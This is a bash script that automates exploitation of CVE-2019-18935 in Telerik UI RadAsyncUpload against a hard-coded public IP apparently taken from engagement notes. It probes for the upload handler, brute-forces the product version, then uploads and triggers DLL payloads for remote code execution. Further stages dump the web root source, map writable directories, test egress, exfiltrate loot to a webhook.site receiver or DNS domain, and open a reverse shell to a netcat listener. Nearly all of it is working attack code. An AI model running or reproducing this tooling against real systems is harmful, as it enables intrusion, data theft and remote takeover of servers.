#!/usr/bin/env bash
#
# CVE-2019-18935 â€” fully self-configuring one-command runner.
# You give it NOTHING (or just a URL) and it finds the target, the version,
# and fires the payload, printing a big SUCCESS banner the instant RCE
# is confirmed.
#
# Works on macOS and Linux natively; on Windows use Git Bash / WSL.
#
#   ./run.sh                 # auto: find target + version, prove RCE (sleep)
#   ./run.sh shell           # ...then fire the reverse shell (start nc first)
#   ./run.sh egress          # ...then prove outbound egress from the target
#   ./run.sh rebuild         # build fresh payloads (every attempt needs new ones)
#   ./run.sh http://HOST:82  # pin the target; everything else still auto
#
# Env vars (all optional, all auto-detected if unset):
#   TARGET_URL / PAGE_URL / FOLDER / ARCH / VERSION /
#   REV_HOST / REV_PORT / PYTHON / C2_URL / DNS_DOMAIN / DROPS
#
# C2_URL   = receiver base URL, e.g. https://webhook.site/<uuid>
# DNS_DOMAIN = OAST domain for the DNS fallback channel, e.g. abc123.oast.pro
# DROPS    = extra web-served dirs (space separated) the payload should copy loot
#            into; run `./run.sh writemap` first and pass every GOOD+served dir.
#
# The ONLY thing you may need to set for 'shell' is where the target can
# reach your C2:  REV_HOST=<ip> REV_PORT=<port>

set -uo pipefail

cd "$(dirname "$0")"
ROOT="$(pwd)"
PAYLOAD_DIR="$ROOT/payloads"
mkdir -p "$PAYLOAD_DIR"

# ---------------------------------------------------------------- colors/log
G='\033[1;32m'; R='\033[1;31m'; Y='\033[1;33m'; B='\033[1;34m'; C='\033[1;36m'; N='\033[0m'
log()  { printf '\n%b[+]%b %s\n' "$B" "$N" "$*"; }
warn() { printf '%b[!]%b %s\n' "$Y" "$N" "$*"; }
die()  { printf '%b[x]%b %s\n' "$R" "$N" "$*" >&2; exit 1; }
info() { printf '      %s\n' "$*"; }

banner() { # $1 = text
  local line="=========================================================="
  printf '\n%b\n%s\n%b\n' "$G" "$line" "$1" "$line"
}

# ---------------------------------------------------------------- args
ARG="${1:-auto}"
case "$ARG" in
  auto|check|versions|exploit|shell|all|dumpsrc|writemap|egress|exfil|rebuild) STAGE="$ARG" ;;
  http://*|https://*)
    TARGET_URL="$ARG"
    case "${2:-}" in
      "") STAGE="${STAGE:-all}" ;;
      auto|check|versions|exploit|shell|all|dumpsrc|writemap|egress|exfil|rebuild) STAGE="$2" ;;
      *) die "unknown stage '$2'" ;;
    esac
    ;;
  *) die "usage: $0 [auto|check|versions|exploit|shell|dumpsrc|writemap|egress|exfil|rebuild|all|http(s)://HOST:PORT]" ;;
esac

BASE_URL=""
FOLDER="${FOLDER:-C:\Windows\Temp}"
ARCH="${ARCH:-both}"
REV_HOST="${REV_HOST:-}"
REV_PORT="${REV_PORT:-4444}"
VERSION="${VERSION:-}"
PYTHON="${PYTHON:-python3}"

# ---------------------------------------------------------------- deps
need_py() {
  command -v "$PYTHON" >/dev/null 2>&1 || return 1
  "$PYTHON" - <<'PY' >/dev/null 2>&1
import requests, Crypto
PY
}
if ! need_py; then
  log "Setting up Python (requests + pycryptodome) in .venv"
  "$PYTHON" -m venv .venv 2>/dev/null || { "$PYTHON" -m pip install --user -q virtualenv && "$PYTHON" -m virtualenv .venv; }
  VENV_PY=".venv/bin/python"
  "$VENV_PY" -m pip install -q --upgrade pip >/dev/null 2>&1
  "$VENV_PY" -m pip install -q pycryptodome requests >/dev/null 2>&1
  PYTHON="$VENV_PY"
fi
info "Python: $PYTHON"

# ---------------------------------------------------------------- payloads
pick_payload() { # $1 base (sleep|revshell) -> echo newest matching dll for $ARCH
  local base="$1" p=""
  case "$ARCH" in
    x86)   p=$(ls -1t "$PAYLOAD_DIR"/${base}-*-x86.dll 2>/dev/null | head -1 || true) ;;
    amd64) p=$(ls -1t "$PAYLOAD_DIR"/${base}-*-amd64.dll 2>/dev/null | head -1 || true) ;;
    *)     p=$(ls -1t "$PAYLOAD_DIR"/${base}-*.dll 2>/dev/null | head -1 || true) ;;
  esac
  printf '%s' "$p"
}

# All payloads for a base+arch, newest first (space separated, names have no spaces).
list_payloads() {
  local base="$1" a="$2"
  case "$a" in
    x86)   ls -1t "$PAYLOAD_DIR"/${base}-*-x86.dll 2>/dev/null || true ;;
    amd64) ls -1t "$PAYLOAD_DIR"/${base}-*-amd64.dll 2>/dev/null || true ;;
    *)     ls -1t "$PAYLOAD_DIR"/${base}-*.dll 2>/dev/null || true ;;
  esac
}
SLEEP_DLL="$(pick_payload sleep)"
REV_DLL="$(pick_payload revshell)"
DUMP_DLL="$(pick_payload dump-src)"
EXFIL_DLL="$(pick_payload exfil)"
PROBE_DLL="$(pick_payload probe-net)"
C2_URL="${C2_URL:-}"
DNS_DOMAIN="${DNS_DOMAIN:-}"
DROPS="${DROPS:-}"
PAYLOAD="${PAYLOAD:-}"
[ -n "$SLEEP_DLL" ] || die "No sleep payload in $PAYLOAD_DIR (run on Windows / let CI build, or ARCH=x86)"
info "sleep payload:   $SLEEP_DLL"
[ -n "$REV_DLL" ] && info "revshell payload: $REV_DLL"
[ -n "$DUMP_DLL" ] && info "dump-src payload: $DUMP_DLL"
[ -n "$EXFIL_DLL" ] && info "exfil payload:    $EXFIL_DLL"
[ -n "$PROBE_DLL" ] && info "egress payload:   $PROBE_DLL"

# A .NET assembly can only be loaded once per w3wp process: the same DLL file is
# a no-op on a second trigger (AssemblyInstaller resolves by assembly identity,
# which carries the filename). Track what we have already fired.
FIRED="$ROOT/.fired"
mark_fired() { printf '%s\n' "$1" >> "$FIRED"; }
was_fired()  { [ -f "$FIRED" ] && grep -qxF "$1" "$FIRED" 2>/dev/null; }

# Newest payload for base+arch that has not been fired yet. Sets CHOSEN and
# CHOSEN_FIRED; PAYLOAD=<path> overrides the choice.
CHOSEN=""; CHOSEN_FIRED=0
choose_unfired() {
  local base="$1" a="$2" f
  CHOSEN=""; CHOSEN_FIRED=0
  if [ -n "$PAYLOAD" ]; then
    CHOSEN="$PAYLOAD"
    was_fired "$PAYLOAD" && CHOSEN_FIRED=1
    return
  fi
  for f in $(list_payloads "$base" "$a"); do
    if ! was_fired "$f"; then CHOSEN="$f"; return; fi
  done
  CHOSEN=$(list_payloads "$base" "$a" | head -1)
  [ -n "$CHOSEN" ] && CHOSEN_FIRED=1
}

# ---------------------------------------------------------------- target discovery
host_ip() { # $1 interface name
  if [ "$(uname -s)" = "Darwin" ]; then
    ipconfig getifaddr "$1" 2>/dev/null || true
  else
    ip -4 -o addr show "$1" 2>/dev/null | awk '{print $4}' | cut -d/ -f1 | head -1 || true
  fi
}
local_ips() { # all non-loopback IPv4 on this host
  if [ "$(uname -s)" = "Darwin" ]; then
    ifconfig 2>/dev/null | awk '/inet / && $2 != "127.0.0.1" {print $2}'
  else
    ip -4 -o addr show 2>/dev/null | awk '$2!="lo" {print $4}' | cut -d/ -f1
  fi
}
# known target from the engagement notes
KNOWN_HOST="125.18.164.11"; KNOWN_PORT="82"
CANDIDATE_URLS=()
add_candidate() { # $1 base like http://1.2.3.4:82
  local u="$1"
  case " ${CANDIDATE_URLS[*]:-} " in *" $u "*) ;; *) CANDIDATE_URLS+=("$u");; esac
}

build_candidates() {
  # 1) explicit user pin (a full URL with ?type=rau, or just a base)
  if [ -n "${TARGET_URL:-}" ]; then
    case "$TARGET_URL" in
      *?type=rau*) add_candidate "$TARGET_URL" ;;
      *) add_candidate "$(rau_url "$TARGET_URL")" ;;
    esac
  fi
  # 2) the known target
  add_candidate "http://${KNOWN_HOST}:${KNOWN_PORT}"
  # 3) local/VPN interfaces on common web ports
  local ip
  for ip in $(local_ips); do
    [ "$ip" = "127.0.0.1" ] && continue
    for p in 82 80 8080 8000; do
      add_candidate "http://${ip}:${p}"
    done
  done
}

rau_url() { printf '%s/Telerik.Web.UI.WebResource.axd?type=rau' "$1"; }

probe_target() {
  build_candidates
  log "DISCOVER: probing ${#CANDIDATE_URLS[@]} candidate target(s) for the RadAsyncUpload handler"
  local base rau body
  for base in "${CANDIDATE_URLS[@]}"; do
    rau="$(rau_url "$base")"
    info "  try $rau"
    body=$(curl -sk --max-time 12 "$rau" 2>/dev/null || true)
    case "$body" in
      *"RadAsyncUpload handler is registered"*)
        TARGET_URL="$rau"
        BASE_URL="$(rau_url "$base")"
        BASE_URL="${BASE_URL%%\?*}"
        log "TARGET FOUND: $TARGET_URL"
        return 0 ;;
      ""|*[![:print:]]*) : ;;  # empty/whitespace -> keep probing
      *) info "     (answered but not RAU)";;
    esac
  done
  warn "No candidate answered with the RAU handler."
  warn "Defaulting to the known target; the version/exploit steps will confirm or fail fast."
  TARGET_URL="$(rau_url "http://${KNOWN_HOST}:${KNOWN_PORT}")"
  BASE_URL="http://${KNOWN_HOST}:${KNOWN_PORT}"
  return 0
}
PAGE_URL="${PAGE_URL:-$BASE_URL}"

# ---------------------------------------------------------------- stages
stage_check() { probe_target; }

stage_versions() {
  log "VERSIONS: discover the vulnerable Telerik UI version"
  if [ -n "$VERSION" ]; then info "VERSION pinned: $VERSION"; return 0; fi
  local testfile; testfile=$(mktemp)
  echo "version-probe" > "$testfile"
  local versions=(
    2017.3.913 2017.2.711 2017.2.621 2017.2.503 2017.1.228 2017.1.118
    2016.3.1027 2016.3.1018 2016.3.914 2016.2.607 2016.2.504 2016.1.225 2016.1.113
    2015.3.1111 2015.3.930 2015.2.826 2015.2.729 2015.2.623 2015.2.604 2015.1.225 2015.1.204
    2014.3.1024 2014.2.724 2014.2.618 2014.1.403 2014.1.225 2013.3.1324 2013.3.1114 2013.3.1015
    2013.2.717 2013.2.611 2013.1.417 2013.1.403 2013.1.220 2012.3.1308 2012.3.1205 2012.3.1016
    2012.2.912 2012.2.724 2012.2.607 2012.1.411 2012.1.215 2011.3.1305 2011.31115 2011.2915
    2011.2712 2011.1519 2011.1413 2011.1315 2010.31317 2010.31215 2010.31109 2010.2929
    2010.2826 2010.2713 2010.1519 2010.1415 2010.1309 2009.31314 2009.31208 2009.31103
    2009.2826 2009.2701 2009.1527 2009.1402 2009.1311 2008.31314 2008.31125 2008.31105
    2008.21001 2008.2826 2008.2723 2008.1619 2008.1515 2008.1415 2007.31425 2007.31314
    2007.31218 2007.21010 2007.2918 2007.1626 2007.1521 2007.1423
  )
  info "Probing ${#versions[@]} known-vulnerable versions (newest first) via RAU_crypto..."
  local v out ok=0
  for v in "${versions[@]}"; do
    out=$("$PYTHON" RAU_crypto/RAU_crypto.py -P "$FOLDER" "$v" "$testfile" "$TARGET_URL" 2>/dev/null || true)
    if printf '%s' "$out" | grep -q 'fileInfo'; then
      VERSION="$v"; ok=1
      log "VERSION MATCH: $v (upload accepted)"
      break
    fi
    info "  - $v: no"
  done
  rm -f "$testfile"
  if [ "$ok" -ne 1 ]; then
    warn "No version matched. Re-run with VERSION=x.y.z if you know it."
    return 1
  fi
}

# upload + return the remote filename the target reports.
# Diagnostics go to stderr; ONLY the filename goes to stdout (it is captured).
upload_payload() { # $1 dll  $2 ver  $3 folder  [$4 exact remote name] -> echo remote filename
  local dll="$1" ver="$2" folder="$3" want="${4:-}"
  log "UPLOAD: $(basename "$dll") -> $folder${want:+ as $want}" >&2
  local out remote args
  args=(-t -u "$TARGET_URL" -v "$ver" -f "$folder" -p "$dll")
  [ -n "$want" ] && args+=(-N "$want")
  out=$("$PYTHON" CVE-2019-18935.py "${args[@]}" 2>&1)
  printf '%s\n' "$out" | sed 's/^/      /' >&2
  if [ -n "$want" ]; then
    remote=$(printf '%s' "$out" | grep -oE "'TempFileName': '$want'" | head -1 | sed "s/.*'TempFileName': '//; s/'\$//")
    # the target may rename; fall back to whatever it actually reports
    [ -n "$remote" ] || remote=$(printf '%s' "$out" | grep -oE "'TempFileName': '[^']+'" | head -1 | sed "s/.*'TempFileName': '//; s/'\$//")
  else
    remote=$(printf '%s' "$out" | grep -oE "'TempFileName': '[^']+'" | head -1 | sed "s/.*'TempFileName': '//; s/'\$//")
    [ -n "$remote" ] || remote=$(printf '%s' "$out" | grep -oE '"TempFileName":"[^"]+"' | head -1 | sed 's/.*"TempFileName":"//; s/"$//')
  fi
  printf '%s' "$remote"
}

# numeric comparison that works on BSD (macOS) and GNU awk-less setups
num_ge() { # $1 a  $2 b -> exit 0 if a >= b
  python3 -c "import sys; sys.exit(0 if float(sys.argv[1]) >= float(sys.argv[2]) else 1)" "$1" "$2" 2>/dev/null
}

# fire the deserialize trigger and echo the measured seconds
trigger_and_time() { # $1 remote filename  [$2 what to expect]
  local remote="$1" t0 t1 rt
  log "TRIGGER: deserializing${2:+ ($2)}" >&2
  t0=$(python3 -c 'import time;print(time.time())' 2>/dev/null || date +%s)
  "$PYTHON" CVE-2019-18935.py -d -r "$remote" -u "$TARGET_URL" -n 4.0.0.0 2>&1 | sed 's/^/      /' || true
  t1=$(python3 -c 'import time;print(time.time())' 2>/dev/null || date +%s)
  rt=$(python3 -c "import sys;print(f'{float(sys.argv[1])-float(sys.argv[2]):.2f}')" "$t1" "$t0" 2>/dev/null || echo 0)
  printf '%s' "$rt"
}

# candidate upload folders, most-likely-to-be-loadable first
FOLDER_CANDIDATES=(
  "${FOLDER}"
  "C:\\inetpub\\wwwroot"
  "C:\\inetpub\\temp"
  "C:\\Windows\\Temp"
  "C:\\temp"
)
[ -n "${FOLDER_LIST:-}" ] && FOLDER_CANDIDATES=($FOLDER_LIST)

stage_exploit() {
  [ -n "$VERSION" ] || die "Need a version (run versions first or set VERSION=)."
  local arches
  if [ "$ARCH" = "both" ]; then arches=(x86 amd64); else arches=("$ARCH"); fi

  local a folder remote rt success=0 dll
  for a in "${arches[@]}"; do
    choose_unfired sleep "$a"
    dll="$CHOSEN"
    [ -n "$dll" ] || { warn "no $a sleep payload"; continue; }
    [ "$CHOSEN_FIRED" -eq 1 ] && warn "$(basename "$dll") already fired â€” rebuild for a new assembly name."
    for folder in "${FOLDER_CANDIDATES[@]}"; do
      [ -n "$folder" ] || continue
      remote=$(upload_payload "$dll" "$VERSION" "$folder")
      [ -n "$remote" ] || { info "upload gave no filename in $folder; trying next"; continue; }
      info "remote file: $remote  (in $folder)"
      rt=$(trigger_and_time "$remote")
      mark_fired "$dll"
      info "response: ${rt}s"
      if num_ge "$rt" 8; then
        banner "SUCCESS  -  CVE-2019-18935 CONFIRMED (RCE)"
        info "Target  : $TARGET_URL"
        info "Version : $VERSION"
        info "Payload : $(basename "$dll")"
        info "Folder  : $folder"
        info "Probe   : response took ${rt}s (sleep payload fired)"
        info ""
        info "To get a shell:  REV_HOST=<c2-ip> REV_PORT=4444 ARCH=$a FOLDER=$folder ./run.sh shell"
        success=1
        break 2
      fi
    done
  done

  if [ "$success" -eq 1 ]; then return 0; fi
  warn "No folder/arch combination produced a ~10s pause. Deserialization is likely being blocked."
  info "Try manually with a specific folder the app pool can load:"
  info "  FOLDER='C:\\inetpub\\wwwroot' ARCH=x86 ./run.sh"
  return 1
}

# generic upload+trigger with a chosen payload
fire_payload() { # $1 dll path  [$2 folder]
  local dll="$1" folder="${2:-C:\Windows\Temp}"
  local remote
  if was_fired "$dll"; then
    warn "$(basename "$dll") was already fired â€” a re-trigger only re-runs if the app pool recycled."
  fi
  remote=$(upload_payload "$dll" "$VERSION" "$folder")
  [ -n "$remote" ] || { warn "no filename reported for $(basename "$dll") in $folder"; return 1; }
  info "remote file: $remote"
  trigger_and_time "$remote"
  mark_fired "$dll"
  return 0
}

stage_dumpsrc() {
  [ -n "$VERSION" ] || die "Need a version (run versions first or set VERSION=)."
  [ -n "$DUMP_DLL" ] || die "No dump-src payload in $PAYLOAD_DIR."
  banner "DUMP SOURCE"
  info "Will zip the web root and drop src.zip into publicly served folders."
  info "After it finishes, try downloading:"
  info "  http://<host>:82/src.zip"
  info "  http://<host>:82/StartUp/src.zip"
  info ""
  local a arches rt done=0 dll
  if [ "$ARCH" = "both" ]; then arches=(x86 amd64); else arches=("$ARCH"); fi
  for a in "${arches[@]}"; do
    choose_unfired dump-src "$a"
    dll="$CHOSEN"
    [ -n "$dll" ] || { warn "no $a dump-src payload"; continue; }
    log "FIRE: $(basename "$dll") (arch $a)"
    rt=$(fire_payload "$dll" "C:\Windows\Temp")
    done=1
    break
  done
  if [ "$done" -ne 1 ]; then die "could not fire the dump payload"; fi
  info "  DONE (see the timestamps or check src.zip manually)"
}

stage_writemap() {
  [ -n "$VERSION" ] || die "Need a version (run versions first or set VERSION=)."
  banner "WRITE-MAP"
  info "Uploading a tiny marker into each candidate dir."
  info "GOOD = writable. It is also fetched back: SERVED = writable AND downloadable."
  info ""

  local root="http://${KNOWN_HOST}:${KNOWN_PORT}"
  local marker="$ROOT/.writemap.txt"
  printf 'writemap %s\n' "$(date -u +%Y%m%dT%H%M%SZ)" > "$marker"

  local dirs=(
    'C:\inetpub\wwwroot\StartUp'
    'C:\inetpub\wwwroot\StartUp\App_Data'
    'C:\inetpub\wwwroot\App_Data'
    'C:\inetpub\wwwroot\uploads'
    'C:\inetpub\wwwroot\Upload'
    'C:\inetpub\wwwroot\files'
    'C:\inetpub\wwwroot\images'
    'C:\inetpub\wwwroot\bin'
    'C:\inetpub\wwwroot\StartUp\Temp'
    'C:\inetpub\vhosts\default\htdocs'
    'C:\inetpub\ftproot'
    'C:\Windows\Temp'
  )
  # dir -> URL path under the site root
  url_for_dir() {
    case "$1" in
      'C:\inetpub\wwwroot')              printf '/' ;;
      'C:\inetpub\wwwroot\StartUp')      printf '/StartUp/' ;;
      'C:\inetpub\wwwroot\'*)            printf '/%s/' "$(printf '%s' "$1" | sed 's#^C:\\inetpub\\wwwroot\\##; s#\\#/#g')" ;;
      'C:\inetpub\vhosts\default\htdocs') printf '/' ;;
      *)                                 printf '' ;;
    esac
  }

  local d remote url code served=()
  for d in "${dirs[@]}"; do
    remote=$(upload_payload "$marker" "$VERSION" "$d" 2>/dev/null)
    if [ -n "$remote" ]; then
      url="$(url_for_dir "$d")"
      if [ -n "$url" ]; then
        code=$(curl -sk -o /dev/null -w '%{http_code}' --max-time 10 "${root}${url}${remote}" 2>/dev/null || echo 000)
        if [ "$code" = "200" ]; then
          printf '  %bSERVED%b %s  ->  %s%s\n' "$G" "$N" "$d" "$url" "$remote"
          served+=("$d")
        else
          printf '  %bwritable%b %s  (HTTP %s)\n' "$Y" "$N" "$d" "$code"
        fi
      else
        printf '  %bwritable%b %s  (no URL mapping; probe by hand)\n' "$Y" "$N" "$d"
      fi
    else
      printf '  %bno%b       %s\n' "$Y" "$N" "$d"
    fi
  done
  rm -f "$marker"
  info ""
  if [ "${#served[@]}" -gt 0 ]; then
    banner "WRITABLE + SERVED: pass these to exfil"
    info "DROPS='${served[*]}' ./run.sh exfil"
    info "The exfil payload copies src.zip, exfil.log and the recon files into"
    info "every DROPS dir, so you can pull them with curl even with egress shut."
  else
    info "No dir is both writable and served. Egress/DNS is the remaining channel:"
    info "  DNS_DOMAIN=<interactsh-domain> ./run.sh exfil"
  fi
}

stage_egress() {
  [ -n "$PROBE_DLL" ] || die "No probe-net payload in $PAYLOAD_DIR (rebuild payloads)."
  banner "EGRESS PROBE"
  info "This is the 'did the payload run at all, or is egress filtered?' oracle."
  info "It TCP-connects from the target and sleeps in proportion to what worked,"
  info "so the response time encodes the answer:"
  info "    0-6s   -> nothing reachable (egress filtered / payload broke)"
  info "    ~8s    -> 1 endpoint reachable"
  info "    ~16s   -> 2 endpoints reachable"
  info "    ~24s+  -> 3+ endpoints: outbound works, stop guessing and exfil"
  info ""
  local eps=()
  local hostport
  if [ -n "$C2_URL" ]; then
    hostport=$(printf '%s' "$C2_URL" | sed -E 's#^[a-z]+://##; s#/.*$##')
    case "$hostport" in
      *:*) eps+=("$hostport") ;;
      *)   case "$C2_URL" in
             https://*) eps+=("$hostport:443" "$hostport:80") ;;
             *)         eps+=("$hostport:80" "$hostport:443") ;;
           esac ;;
    esac
  fi
  eps+=("1.1.1.1:443" "8.8.8.8:53")
  [ -n "$DNS_DOMAIN" ] && eps+=("dns:$DNS_DOMAIN")

  local cfg="$ROOT/.net.txt" rn rt
  local saved_payload="$PAYLOAD"
  PAYLOAD=""                      # the probe is always probe-net, never $PAYLOAD
  choose_unfired probe-net x86
  PAYLOAD="$saved_payload"
  local probe="$CHOSEN"
  [ -n "$probe" ] || probe="$PROBE_DLL"
  [ -n "$probe" ] || die "No probe-net payload (rebuild payloads)."
  [ "$CHOSEN_FIRED" -eq 1 ] && warn "$(basename "$probe") already fired â€” rebuild if the app pool has not recycled."
  printf '%s\n' "${eps[@]}" | awk '!seen[$0]++' > "$cfg"
  info "endpoints: $(tr '\n' ' ' < "$cfg")"
  rn=$(upload_payload "$probe" "$VERSION" 'C:\Windows\Temp')
  rm -f "$cfg"
  [ -n "$rn" ] || die "Could not upload the probe payload."
  rt=$(trigger_and_time "$rn" "egress probe: expect 8s per reachable endpoint")
  mark_fired "$probe"
  info "response: ${rt}s"
  case "$rt" in
    ''|*[!0-9.]*) warn "unparseable timing" ; return 1 ;;
  esac
  if num_ge "$rt" 7.5; then
    banner "EGRESS OPEN â€” outbound works"
    info "Fire the exfil:  C2_URL=... DNS_DOMAIN=... ./run.sh exfil"
    return 0
  fi
  warn "EGRESS APPEARS BLOCKED (or the payload did not run)."
  info "Next, in this order:"
  info "  1. ./run.sh exfil         # the payload itself may still reach an allowed IP"
  info "  2. DNS: set DNS_DOMAIN=<interactsh domain> and re-run â€” UDP/53 is rarely filtered"
  info "  3. writemap: find a writable+served dir and use DROPS=..."
  info "  4. ./run.sh shell         # reverse shell over an allowed port (443)"
  return 1
}

stage_exfil() {
  [ -n "$VERSION" ] || die "Need a version (run versions first or set VERSION=)."
  [ -n "$EXFIL_DLL" ] || die "No exfil payload in $PAYLOAD_DIR."
  [ -n "$C2_URL" ] || [ -n "$DNS_DOMAIN" ] || die "Set C2_URL (https receiver) and/or DNS_DOMAIN."
  banner "EXFIL"
  info "webhook.site free tokens cap at 100 requests and expire when idle â€”"
  info "make a fresh token for every attempt."
  info ""

  # ---- build the receiver config, one directive per line -------------------
  local cfg="$ROOT/.c2.txt" rc
  : > "$cfg"
  [ -n "$C2_URL" ] && printf '%s\n' "$C2_URL" >> "$cfg"
  [ -n "$DNS_DOMAIN" ] && printf 'dns:%s\n' "$DNS_DOMAIN" >> "$cfg"
  local d
  for d in $DROPS; do printf 'drop:%s\n' "$d" >> "$cfg"; done
  info "receiver config:"
  sed 's/^/      /' "$cfg"

  # ---- drop it at the FIXED name the payload looks for --------------------
  log "uploading receiver config -> C:\\Windows\\Temp\\c2.txt"
  rc=$(upload_payload "$cfg" "$VERSION" 'C:\Windows\Temp' 'c2.txt')
  rm -f "$cfg"
  if [ -z "$rc" ]; then
    warn "c2.txt upload failed; the payload will fall back to scanning *.txt in Temp"
  elif [ "$rc" != "c2.txt" ]; then
    warn "target renamed the config to '$rc'; the payload's fallback scan will still find it"
  else
    info "config in place as C:\\Windows\\Temp\\c2.txt"
  fi

  # ---- prove egress first (cheap, and tells us if the rest can work) ------
  if [ -n "$PROBE_DLL" ]; then
    stage_egress || true
  fi

  # ---- fire -----------------------------------------------------------------
  local a arches dll rt
  if [ "$ARCH" = "both" ]; then arches=(x86 amd64); else arches=("$ARCH"); fi
  for a in "${arches[@]}"; do
    choose_unfired exfil "$a"
    dll="$CHOSEN"
    [ -n "$dll" ] || { warn "no $a exfil payload"; continue; }
    if [ "$CHOSEN_FIRED" -eq 1 ]; then
      warn "$(basename "$dll") was already loaded in w3wp â€” re-triggering it is a no-op."
      warn "Rebuild the payloads (CI or build-dll.bat) for a fresh assembly name."
    fi
    log "FIRE: $(basename "$dll") (arch $a)"
    rt=$(fire_payload "$dll" 'C:\Windows\Temp')
    info "response: $(printf '%s' "$rt" | tail -1)s (async worker, so this stays short even on success)"
    break
  done

  # ---- collect --------------------------------------------------------------
  local token=""
  [ -n "$C2_URL" ] && token=$(printf '%s' "$C2_URL" | sed -nE 's#.*/([0-9a-fA-F-]{36}).*#\1#p')
  info ""
  if [ -n "$token" ]; then
    info "Polling the receiver for up to 5 min. Ctrl-C and re-run this line any time:"
    info "  ./pull-exfil.sh $token"
    ( cd "$ROOT" && bash ./pull-exfil.sh "$token" ) || true
  else
    info "Pull manually:  ./pull-exfil.sh <token-uuid>"
  fi
  banner "EXFIL FIRED"
}

stage_shell() {
  [ -n "$VERSION" ] || die "Need a version (run versions first or set VERSION=)."
  [ -n "$REV_DLL" ] || die "No revshell payload in $PAYLOAD_DIR."
  if [ -z "$REV_HOST" ]; then
    REV_HOST="$(local_ips | head -1)"
    [ -n "$REV_HOST" ] || REV_HOST=127.0.0.1
  fi
  banner "REVERSE SHELL"
  info "C2 target (the machine the WEB SERVER connects back to): $REV_HOST:$REV_PORT"
  info "Make sure a listener is running there:  nc -lvp $REV_PORT"
  info "Port 443/80 is far more likely to pass egress filtering than 4444."
  info ""

  # The payload cannot see our env, so ship the C2 to it.
  local cfg="$ROOT/.rev.txt" rc
  printf '%s:%s\n' "$REV_HOST" "$REV_PORT" > "$cfg"
  rc=$(upload_payload "$cfg" "$VERSION" 'C:\Windows\Temp' 'rev.txt')
  rm -f "$cfg"
  [ "$rc" = "rev.txt" ] || warn "rev.txt landed as '${rc:-nothing}'; payload will fall back to 127.0.0.1:4444"

  local arches
  if [ "$ARCH" = "both" ]; then arches=(x86 amd64); else arches=("$ARCH"); fi
  local a folder remote triggered=0 dll
  for a in "${arches[@]}"; do
    choose_unfired revshell "$a"
    dll="$CHOSEN"
    [ -n "$dll" ] || { warn "no $a revshell payload"; continue; }
    [ "$CHOSEN_FIRED" -eq 1 ] && warn "$(basename "$dll") already fired â€” rebuild for a new assembly name."
    for folder in "${FOLDER_CANDIDATES[@]}"; do
      [ -n "$folder" ] || continue
      log "SHELL: uploading $(basename "$dll") -> $folder (arch $a)"
      remote=$(upload_payload "$dll" "$VERSION" "$folder")
      [ -n "$remote" ] || { info "no filename in $folder; trying next"; continue; }
      info "remote file: $remote"
      "$PYTHON" CVE-2019-18935.py -d -r "$remote" -u "$TARGET_URL" -n 4.0.0.0 2>&1 | sed 's/^/      /' || true
      mark_fired "$dll"
      info "Fired in $folder (arch $a). Check your C2 listener for the callback."
      triggered=1
      # keep trying other combos in the background is overkill; stop here.
      break 2
    done
  done
  if [ "$triggered" -ne 1 ]; then
    warn "Could not upload+trigger the shell. Confirm the working folder from the sleep test."
    return 1
  fi
  banner "TRIGGERED"
  info "Check your C2 listener ($REV_HOST:$REV_PORT) for the callback."
  info "If no callback: try the other arch (ARCH=amd64/x86) and/or another version."
}

stage_rebuild() {
  banner "REBUILD PAYLOADS"
  info "Every attempt needs fresh DLLs: a loaded assembly name is dead in w3wp."
  info ""
  if command -v cl.exe >/dev/null 2>&1; then
    local s
    for s in sleep revshell dump-src exfil probe-net; do
      log "build-dll.bat $s.c"
      cmd //c build-dll.bat "$s.c" || warn "build failed for $s.c"
    done
    return 0
  fi
  info "No cl.exe here (macOS/Linux). Let CI build them:"
  info "  git add -A && git commit -m 'payloads' && git push"
  info "  gh workflow run build-dlls.yml    # if you have gh"
  info "then:  git pull"
  info ""
  info "Or on any Windows box with Visual Studio:  build-dll.bat exfil.c"
}

# ---------------------------------------------------------------- dispatch
log "CVE-2019-18935 one-command runner (stage: $STAGE)"
case "$STAGE" in
  rebuild)  stage_rebuild ;;
  check)    stage_check ;;
  versions) stage_check; stage_versions ;;
  exploit|all) stage_check; stage_versions || { warn "version discovery failed"; exit 1; }; stage_exploit ;;
  shell)    stage_check; stage_versions || { warn "version discovery failed"; exit 1; }; stage_shell ;;
  dumpsrc)  stage_check; stage_versions || { warn "version discovery failed"; exit 1; }; stage_dumpsrc ;;
  writemap) stage_check; stage_versions || { warn "version discovery failed"; exit 1; }; stage_writemap ;;
  egress)   stage_check; stage_versions || { warn "version discovery failed"; exit 1; }; stage_egress ;;
  exfil)    stage_check; stage_versions || { warn "version discovery failed"; exit 1; }; stage_exfil ;;
esac
